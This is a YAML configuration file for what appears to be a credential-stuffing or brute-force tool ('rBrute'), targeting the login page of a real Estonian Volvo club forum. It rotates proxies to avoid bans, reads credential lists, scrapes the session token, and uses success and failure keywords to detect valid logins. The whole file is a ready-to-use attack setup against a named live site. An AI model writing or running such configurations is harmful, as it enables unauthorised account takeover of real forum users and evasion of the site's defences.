settings:
  configName: "volvoclub.ee"
  botCount: 2
  unbanProxiesAfter: 20
  proxyMaxRetries: 3
  useProxy: true
  resultsPath: "/home/risto/code/go/src/github.com/rislah/rBrute/results"
  proxyPath: "/home/risto/code/go/src/github.com/rislah/rBrute/out.txt"
  credentialsPath: "/home/risto/code/go/src/github.com/rislah/rBrute/creds.txt"
stages:
  globalHeaders:
    - key: "Accept"
      value: "*/*"
    - key: "Cache-Control"
      value: "no-cache"
  preLogin:
    - url: "https://foorum.volvoclub.ee/ucp.php?mode=login"
      method: "GET"
      variablesToSave:
        - name: "<sid>"
          leftDelimiter: "name=\"sid\" value=\""
          rightDelimiter: "\""
  login:
    url: "https://foorum.volvoclub.ee/ucp.php?mode=login"
    method: "POST"
    body: "username=<username>&password=<password>&sid=<sid>&login=Logi+sisse"
    headers:
      - key: "Content-Type"
        value: "application/x-www-form-urlencoded"
    keywords:
      success:
        text: [ "Privaats√µnumid" ]
      failure:
        text: [ "Sisestasid vale kasutajanime" ]
